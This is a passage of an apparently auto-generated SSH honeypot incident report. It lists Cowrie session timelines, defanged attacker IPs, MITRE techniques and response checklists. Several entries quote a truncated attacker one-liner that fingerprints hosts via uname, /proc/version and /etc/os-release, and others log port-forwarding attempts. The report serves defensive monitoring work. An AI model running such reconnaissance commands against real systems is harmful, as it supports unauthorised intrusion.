- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2aa9337080f

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-19 06:08 |
| **Last Seen** | 2026-07-19 06:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:08:45` | `cowrie.session.connect` |
| `2026-07-19 06:08:46` | `cowrie.client.version` |
| `2026-07-19 06:08:46` | `cowrie.client.kex` |
| `2026-07-19 06:08:47` | `cowrie.login.success` |
| `2026-07-19 06:08:47` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e31f2fa0e4a4

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-19 06:09 |
| **Last Seen** | 2026-07-19 06:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:09:10` | `cowrie.session.connect` |
| `2026-07-19 06:09:11` | `cowrie.client.version` |
| `2026-07-19 06:09:11` | `cowrie.client.kex` |
| `2026-07-19 06:09:13` | `cowrie.login.success` |
| `2026-07-19 06:09:14` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8b2608cd54

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-07-19 06:09 |
| **Last Seen** | 2026-07-19 06:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:09:25` | `cowrie.session.connect` |
| `2026-07-19 06:09:26` | `cowrie.client.version` |
| `2026-07-19 06:09:26` | `cowrie.client.kex` |
| `2026-07-19 06:09:30` | `cowrie.login.success` |
| `2026-07-19 06:09:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-937db42cd74d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:09 |
| **Last Seen** | 2026-07-19 06:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:09:49` | `cowrie.session.connect` |
| `2026-07-19 06:09:49` | `cowrie.client.version` |
| `2026-07-19 06:09:49` | `cowrie.client.kex` |
| `2026-07-19 06:09:51` | `cowrie.login.success` |
| `2026-07-19 06:09:52` | `cowrie.session.params` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.success` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.command.input` |
| `2026-07-19 06:09:52` | `cowrie.log.closed` |
| `2026-07-19 06:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd19dd085ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:11 |
| **Last Seen** | 2026-07-19 06:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:11:43` | `cowrie.session.connect` |
| `2026-07-19 06:11:43` | `cowrie.client.version` |
| `2026-07-19 06:11:43` | `cowrie.client.kex` |
| `2026-07-19 06:11:45` | `cowrie.login.success` |
| `2026-07-19 06:11:46` | `cowrie.session.params` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.success` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.command.input` |
| `2026-07-19 06:11:46` | `cowrie.log.closed` |
| `2026-07-19 06:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985a2551732f

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-19 06:12 |
| **Last Seen** | 2026-07-19 06:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:12:07` | `cowrie.session.connect` |
| `2026-07-19 06:12:08` | `cowrie.client.version` |
| `2026-07-19 06:12:08` | `cowrie.client.kex` |
| `2026-07-19 06:12:09` | `cowrie.login.success` |
| `2026-07-19 06:12:10` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62805646055f

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-07-19 06:12 |
| **Last Seen** | 2026-07-19 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:12:15` | `cowrie.session.connect` |
| `2026-07-19 06:12:15` | `cowrie.client.version` |
| `2026-07-19 06:12:15` | `cowrie.client.kex` |
| `2026-07-19 06:12:16` | `cowrie.login.success` |
| `2026-07-19 06:12:17` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a91cb375e0

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-07-19 06:12 |
| **Last Seen** | 2026-07-19 06:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:12:26` | `cowrie.session.connect` |
| `2026-07-19 06:12:27` | `cowrie.client.version` |
| `2026-07-19 06:12:27` | `cowrie.client.kex` |
| `2026-07-19 06:12:30` | `cowrie.login.success` |
| `2026-07-19 06:12:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6824da15ae3e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:13 |
| **Last Seen** | 2026-07-19 06:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:13:35` | `cowrie.session.connect` |
| `2026-07-19 06:13:35` | `cowrie.client.version` |
| `2026-07-19 06:13:35` | `cowrie.client.kex` |
| `2026-07-19 06:13:36` | `cowrie.login.success` |
| `2026-07-19 06:13:37` | `cowrie.session.params` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.success` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:37` | `cowrie.command.input` |
| `2026-07-19 06:13:38` | `cowrie.log.closed` |
| `2026-07-19 06:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6acc4416d97b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:15 |
| **Last Seen** | 2026-07-19 06:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:15:25` | `cowrie.session.connect` |
| `2026-07-19 06:15:25` | `cowrie.client.version` |
| `2026-07-19 06:15:25` | `cowrie.client.kex` |
| `2026-07-19 06:15:27` | `cowrie.login.success` |
| `2026-07-19 06:15:28` | `cowrie.session.params` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.success` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.command.input` |
| `2026-07-19 06:15:28` | `cowrie.log.closed` |
| `2026-07-19 06:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8f4131c8e8

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-07-19 06:16 |
| **Last Seen** | 2026-07-19 06:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:16:27` | `cowrie.session.connect` |
| `2026-07-19 06:16:27` | `cowrie.client.version` |
| `2026-07-19 06:16:27` | `cowrie.client.kex` |
| `2026-07-19 06:16:29` | `cowrie.login.success` |
| `2026-07-19 06:16:30` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6873de0cf5dc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 06:16 |
| **Last Seen** | 2026-07-19 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:16:30` | `cowrie.session.connect` |
| `2026-07-19 06:16:30` | `cowrie.client.version` |
| `2026-07-19 06:16:30` | `cowrie.client.kex` |
| `2026-07-19 06:16:30` | `cowrie.login.success` |
| `2026-07-19 06:16:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:16:31` | `cowrie.direct-tcpip.data` |
| `2026-07-19 06:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc32ce15609b

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-19 06:16 |
| **Last Seen** | 2026-07-19 06:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:16:41` | `cowrie.session.connect` |
| `2026-07-19 06:16:41` | `cowrie.client.version` |
| `2026-07-19 06:16:41` | `cowrie.client.kex` |
| `2026-07-19 06:16:43` | `cowrie.login.success` |
| `2026-07-19 06:16:43` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3869a8e0da72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:17 |
| **Last Seen** | 2026-07-19 06:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:17:11` | `cowrie.session.connect` |
| `2026-07-19 06:17:11` | `cowrie.client.version` |
| `2026-07-19 06:17:11` | `cowrie.client.kex` |
| `2026-07-19 06:17:12` | `cowrie.login.success` |
| `2026-07-19 06:17:14` | `cowrie.session.params` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.success` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.command.input` |
| `2026-07-19 06:17:14` | `cowrie.log.closed` |
| `2026-07-19 06:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e809fb222bc4

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-19 06:18 |
| **Last Seen** | 2026-07-19 06:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:18:22` | `cowrie.session.connect` |
| `2026-07-19 06:18:22` | `cowrie.client.version` |
| `2026-07-19 06:18:22` | `cowrie.client.kex` |
| `2026-07-19 06:18:23` | `cowrie.login.success` |
| `2026-07-19 06:18:23` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c1f41f085b

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-07-19 06:18 |
| **Last Seen** | 2026-07-19 06:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:18:28` | `cowrie.session.connect` |
| `2026-07-19 06:18:28` | `cowrie.client.version` |
| `2026-07-19 06:18:28` | `cowrie.client.kex` |
| `2026-07-19 06:18:29` | `cowrie.login.success` |
| `2026-07-19 06:18:30` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05d010938af

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:18 |
| **Last Seen** | 2026-07-19 06:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:18:56` | `cowrie.session.connect` |
| `2026-07-19 06:18:57` | `cowrie.client.version` |
| `2026-07-19 06:18:57` | `cowrie.client.kex` |
| `2026-07-19 06:18:58` | `cowrie.login.success` |
| `2026-07-19 06:19:00` | `cowrie.session.params` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.success` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.command.input` |
| `2026-07-19 06:19:00` | `cowrie.log.closed` |
| `2026-07-19 06:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1d8c7a6a35

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:20 |
| **Last Seen** | 2026-07-19 06:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:20:36` | `cowrie.session.connect` |
| `2026-07-19 06:20:36` | `cowrie.client.version` |
| `2026-07-19 06:20:36` | `cowrie.client.kex` |
| `2026-07-19 06:20:38` | `cowrie.login.success` |
| `2026-07-19 06:20:39` | `cowrie.session.params` |
| `2026-07-19 06:20:39` | `cowrie.command.input` |
| `2026-07-19 06:20:39` | `cowrie.command.input` |
| `2026-07-19 06:20:39` | `cowrie.command.input` |
| `2026-07-19 06:20:39` | `cowrie.command.input` |
| `2026-07-19 06:20:39` | `cowrie.command.input` |
| `2026-07-19 06:20:40` | `cowrie.command.success` |
| `2026-07-19 06:20:40` | `cowrie.command.input` |
| `2026-07-19 06:20:40` | `cowrie.command.input` |
| `2026-07-19 06:20:40` | `cowrie.command.input` |
